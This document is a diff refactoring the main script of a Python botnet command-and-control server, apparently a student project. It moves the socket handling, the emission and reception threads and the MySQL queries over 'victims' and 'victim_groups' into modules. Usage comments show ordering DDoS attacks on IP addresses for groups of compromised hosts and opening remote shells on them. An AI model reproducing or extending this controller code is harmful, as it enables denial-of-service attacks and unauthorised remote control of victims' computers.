@@ -1,137 +1,20 @@
-import socket
-from env import *
-import threading
 import argparse
-from queue import Queue, Empty
-import select
-import base64
 import mysql.connector
-import sys
-import rsa
 import json
-from base64 import b64encode
+import socket
+import select
+import threading
+import rsa
+import base64
+
+from env import *
+from database import *
+from network import *
+from functions import *
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
-
-
-
-
-
-# Fonctions
-
-
-
-def handle_client(host, port, queue):
-    running = True
-
-    while running:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.bind((host, port))
-            s.listen()
-            print("ecoute sur : " + str(host) + ":" + str(port))
-            conn, addr = s.accept()
-        
-
-        return conn, addr
-
-
-def emission(queue, conn, addr):
-
-    running = True
-    while running:
-        message = queue.get()
-
-        if message == 'stop-thread':
-            running = False
-            print("stopping emission thread on ip " + str(addr))
-        else:
-            conn.sendall(message)
-            # print("data sent to " + str(addr))
-
-
-def reception(queue, conn, addr):
-
-    running = True
-    while running:
-        data = conn.recv(1024)
-        if not data:
-            running = False
-            print("stopping reception thread on ip " + str(addr))
-        else:
-            queue.put(data)
-            print("data received from " + str(addr))
-
-
-
-def group_exists(group_name):
-    query = "SELECT id FROM groups WHERE name = %s;"
-    values = (group_name, )
-
-    mycursor.execute(query, values)
-    result = mycursor.fetchall()
-
-    return len(result) > 0
-
-
-def get_group_id(group_name):
-    query = "SELECT id FROM groups WHERE name = %s"
-    values = (group_name, )
-
-    mycursor.execute(query, values)
-    result = mycursor.fetchall()
-
-    if len(result) < 1:
-        return None
-    else:
-        return result[0][0]
-    
-
-def get_group_of(id = None, uid = None):
-    if id is not None:
-        query = "SELECT groups.name FROM groups INNER JOIN victim_groups ON groups.id = victim_groups.group_id WHERE victim_groups.victim_id = %s"
-        values = (id, )
-    elif uid is not None:
-        query = "SELECT groups.name FROM groups INNER JOIN victim_groups ON groups.id = victim_groups.group_id WHERE victim_groups.victim_id = (SELECT id FROM victims WHERE uid = %s)"
-        values = (uid, )
-    else:
-        return None
-
-    mycursor.execute(query, values)
-    result = mycursor.fetchall()
-
-    groups = []
-
-    for group in result:
-        groups.append(group[0])
-
-    if len(result) < 1:
-        return None
-    else:
-        return groups
-    
-
-
-
-def format_attack_data(type, id, data):
-
-    json_data = json.loads('{"action":"' + type + '", "id":"' + str(id) + '"}')
-
-    json_data.update(data)
-
-    print("json_data = " + str(json_data))
-
-    return json_data
-    
-    
-
-
-
-
-# Fin fonctions
-
-
+from Crypto.Util.Padding import pad, unpad
+from queue import Queue, Empty
 
 # Arguments
 # -h, --help            montre le message d'aide
@@ -146,9 +29,7 @@ def format_attack_data(type, id, data):
 
 # python3 main.py -g ESGI,PARIS -a ddos 10.11.12.13
 # python3 main.py -h 10.10.10.10 -a shell
-
 # python3 main.py -cg ESGI 100.100.100.100,13.13.13.13
-
 
 parser = argparse.ArgumentParser()
 
@@ -207,8 +88,6 @@ group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionn
 args = parser.parse_args()
 
 
-
-
 # Database
 db = mysql.connector.connect(
     host=DBHOST,
@@ -216,11 +95,7 @@ db = mysql.connector.connect(
     password=DBPASSWORD,
     database=DB
 )
-
-
 mycursor = db.cursor()
-
-
 
 if args.ddos:
     if not args.address or not args.time:
@@ -1004,28 +879,6 @@ elif args.start:
 
                 except Empty:
                     pass
-                    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 else :
     parser.error("no action specified. Use -h/--help for help")
-
 db.commit()
